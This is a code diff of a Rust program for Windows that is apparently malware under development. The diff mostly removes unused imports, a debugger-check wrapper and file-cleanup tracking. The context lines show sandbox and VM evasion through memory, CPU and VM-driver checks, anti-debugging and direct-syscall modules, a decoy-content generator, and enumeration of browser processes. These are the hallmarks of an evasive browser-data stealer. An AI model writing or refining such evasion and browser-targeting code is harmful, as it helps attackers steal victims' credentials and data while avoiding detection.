@@ -511,11 +511,11 @@ mod syscalls {
 
 use std::{
     env,
-    ffi::{c_void, OsStr},
+    ffi::OsStr,
     fs,
     mem,
     os::windows::ffi::OsStrExt,
-    path::{Path, PathBuf},
+    path::PathBuf,
     thread,
     time::{Duration, SystemTime, UNIX_EPOCH},
 };
@@ -523,9 +523,8 @@ use std::{
 use winreg::enums::HKEY_LOCAL_MACHINE;
 use winreg::RegKey;
 use windows::{
-    core::{PCWSTR, PWSTR},
+    core::PWSTR,
     Win32::{
-        Foundation::HANDLE,
         System::{
             Diagnostics::ToolHelp::{
                 CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W,
@@ -622,10 +621,6 @@ fn s_decoy_body() -> String {
     ])
 }
 
-fn is_debugger_attached() -> bool {
-    anti::debugger_present()
-}
-
 pub(crate) fn is_restricted_host() -> bool {
     low_physical_memory() || low_cpu_count() || vm_drivers_present()
 }
@@ -694,7 +689,6 @@ fn session_tag() -> String {
 }
 
 struct Cleanup {
-    files: Vec<PathBuf>,
     dirs: Vec<PathBuf>,
     spawned_pid: Option<u32>,
 }
@@ -702,14 +696,9 @@ struct Cleanup {
 impl Cleanup {
     fn new() -> Self {
         Self {
-            files: Vec::new(),
             dirs: Vec::new(),
             spawned_pid: None,
         }
-    }
-
-    fn track_file(&mut self, path: PathBuf) {
-        self.files.push(path);
     }
 
     fn track_dir(&mut self, path: PathBuf) {
@@ -728,9 +717,6 @@ impl Drop for Cleanup {
                     let _ = syscalls::close_handle(proc);
                 }
             }
-        }
-        for path in &self.files {
-            let _ = fs::remove_file(path);
         }
         for path in &self.dirs {
             let _ = fs::remove_dir_all(path);
@@ -769,7 +755,7 @@ fn find_browser_pids(target_exe: &str) -> Vec<u32> {
                 }
             }
         }
-        let _ = unsafe { syscalls::close_handle(snap) };
+        let _ = syscalls::close_handle(snap);
     }
     pids
 }
